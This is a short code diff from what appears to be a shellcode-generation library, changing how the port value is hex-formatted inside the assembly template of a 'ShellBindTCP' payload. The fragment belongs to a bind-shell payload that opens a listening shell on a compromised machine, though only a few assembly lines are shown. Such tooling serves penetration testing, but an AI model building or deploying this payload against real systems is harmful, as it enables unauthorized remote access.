@@ -53,7 +53,7 @@ class ShellBindTCP(HatVenom):
             mov rdi, rax
             xor rsi, rsi
             push rsi
-            mov esi, 0x{bport}0101
+            mov esi, 0x{bport.hex()}0101
             sub esi, 1
             push rsi
             mov rsi, rsp
